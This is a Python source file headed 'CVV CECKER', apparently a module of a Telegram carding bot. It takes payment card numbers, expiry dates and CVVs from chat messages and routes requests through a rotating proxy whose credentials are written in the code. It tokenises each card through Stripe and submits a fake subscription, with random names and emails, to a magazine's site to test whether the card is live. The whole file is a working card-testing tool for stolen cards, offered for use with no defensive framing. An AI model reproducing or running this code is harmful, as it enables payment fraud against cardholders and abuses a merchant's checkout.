# CVV CECKER

import requests
import time
import string
import random
import re

from aiogram import types
from aiogram.utils.exceptions import Throttled

from CARDINGBOT import SUDO_USERS, smx
from telethon import events

BLACKLISTED = "547984"
ANTISPAM = "0.4"

# USE YOUR ROTATING PROXY API IN DICT FORMAT http://user:pass@providerhost:port
proxies = {
           'http': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/',
           'https': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/'
}

session = requests.Session()
# Random DATA
letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for i in range(6))
Last = ''.join(random.choice(letters) for i in range(6))
PWD = ''.join(random.choice(letters) for i in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'


@smx.on(events.NewMessage(incoming=True, pattern=r".cvv(?: |$)(.*)"))
async def ch(message: types.Message):
    if ch.sender_id in SUDO_USERS:
        await message.answer_chat_action('typing')
        tic = time.perf_counter()
        try:
            await smx.throttle('chk', rate=ANTISPAM)
        except Throttled:
            await message.reply('<b>Too many requests!</b>\n'
                                f'Blocked For {ANTISPAM} seconds')
        else:
            if message.reply_to_message:
                cc = message.reply_to_message.text
            else:
                cc = message.text[len('/chk '):]

            if len(cc) == 0:
                return await message.reply("<b>No Card to chk</b>")

            x = re.findall(r'\d+', cc)
            ccn = x[0]
            mm = x[1]
            yy = x[2]
            cvv = x[3]
            if mm.startswith('2'):
                mm, yy = yy, mm
            if len(mm) >= 3:
                mm, yy, cvv = yy, cvv, mm
            if len(ccn) < 15 or len(ccn) > 16:
                return await message.reply('<b>Failed to parse Card</b>\n'
                                           '<b>Reason: Invalid Format!</b>')   
            BIN = ccn[:6]
            if BIN in BLACKLISTED:
                return await message.reply('<b>BLACKLISTED BIN</b>')
        # get guid muid sid
            headers = {
                "user-agent": UA,
                "accept": "application/json, text/plain, */*",
                "content-type": "application/x-www-form-urlencoded"
            }

            b = session.get('https://ip.seeip.org/', proxies=proxies).text

            s = session.post('https://m.stripe.com/6', headers=headers, proxies=proxies)
            r = s.json()
            Guid = r['guid']
            Muid = r['muid']
            Sid = r['sid']

        # hmm
            load = {
                "guid": Guid,
                "muid": Muid,
                "sid": Sid,
                "key": "pk_live_oljKIizPrbgI4FSG4XcYnPLx",
                "card[name]": Name,
                "card[number]": ccn,
                "card[exp_month]": mm,
                "card[exp_year]": yy,
                "card[cvc]": cvv
            }

            header = {
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": UA,
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "accept-language": "en-US,en;q=0.9"
            }

            rx = session.post('https://api.stripe.com/v1/tokens',
                              data=load, headers=header, proxies=proxies)
            token = rx.json()['id']
            LastF = f'************{ccn[-4:]}'

            payload = {
                "subscription_type": "digital",
                "first_name": First,
                "last_name": Last,
                "email": Email,
                "login_pass": PWD,
                "confirm_pass": PWD,
                "shipping_country": "United+States",
                "card_number": LastF,
                "card_cvc": cvv,
                "card_expiry_month": mm,
                "card_expiry_year": yy,
                "action": "register",
                "stripe_token": token,
                "last4": token
            }

            head = {
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "user-agent": UA,
                "origin": "https://preludemag.com",
                "referer": "https://preludemag.com/subscribe/",
                "accept-language": "en-US,en;q=0.9"
            }

            ri = session.post('https://preludemag.com/subscribe/', data=payload,
                          headers=head, proxies=proxies)
            toc = time.perf_counter()

            if 'success' in ri.text:
                return await message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #ApprovedCVV
<b>MSG</b>➟ {ri.text}
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
''')

            if 'incorrect_cvc' in ri.text:
                return await message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #ApprovedCCN
<b>MSG</b>➟ {ri.text}
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
''')

            if 'declined' in ri.text:
                return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {ri.text}
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
''')

            await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ DEAD
<b>MSG</b>➟ {ri.text}
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
''')
